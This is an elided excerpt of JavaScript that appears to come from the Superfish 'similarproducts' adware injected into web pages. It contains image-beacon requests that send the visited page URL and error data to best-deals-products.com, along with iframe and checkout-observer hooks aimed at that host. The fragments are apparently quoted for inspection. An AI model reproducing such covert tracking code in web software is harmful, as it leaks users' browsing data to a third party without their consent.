    ...
    window.onerror = function(errorMessage, fileName, line)
    {
        ...
        try
        {
            if (fileName.match(/superfish/i) && Math.floor(Math.random() * 9999) == 1)
            {
                ...
                request = new Image();
                request.src = 'https://www.best-deals-products.com/ws/trackSession.action?' + reportQueryString.join('&');
            }
        }
        catch(e){}
    };
...
//    }
    ...
    return matchStr ? br.indexOf(matchStr) > 0 : br;
        ...
        spsupport.pluginDomain = 'https://www.best-deals-products.com/ws/';
...
setQueryString = function(obj_to_add,initial_QS){
    ...
    initial_QS.replace(
        ...
        if (!similarproducts.b.qsObj.dlsource) {
            similarproducts.b.qsObj.dlsource = "mpxbqdr";
        }
        ...
        similarproducts.sfdebugger = (function()
{
	...
	{
		stack: [],
		appDomain: 'https://www.best-deals-products.com/ws/',//similarproducts.b.site,
        ...
        similarproducts.checkoutObserver = (function()
{
	...
	{
		appDomain: 'https://www.best-deals-products.com/ws/',
	...
	return CheckoutObserver
        ...
        try
        {
            ...
            {
                request = new Image();
                request.src = 'https://www.best-deals-products.com/ws/trackSession.action?action=sample-user-traffic&dlsource='+similarproducts.b.qsObj.dlsource+'&page_url=' + encodeURIComponent(document.location.href);
            }
        }
        catch(e){}
    ...
    return {
        ...
        if (!similarproducts.utilities.blacklistHandler.isWSBlacklist() && !similarproducts.utilities.blacklistHandler.isPageBlacklist() || !similarproducts.utilities.blacklistHandler.isCPNBlacklist() || similarproducts.utilities.blacklistHandler.isCarsDomainWhiteList())
        {
            ...
            similarproducts.userData.createIframe("https://www.best-deals-products.com/ws/", function()
            {
                ...
                // Disable WS for Lenovo in not paying countries
                if (similarproducts.b.qsObj.dlsource == 'hdrykzc' && !similarproducts.utilities.blacklistHandler.isPayingCountry())
                {
                    return;
                }
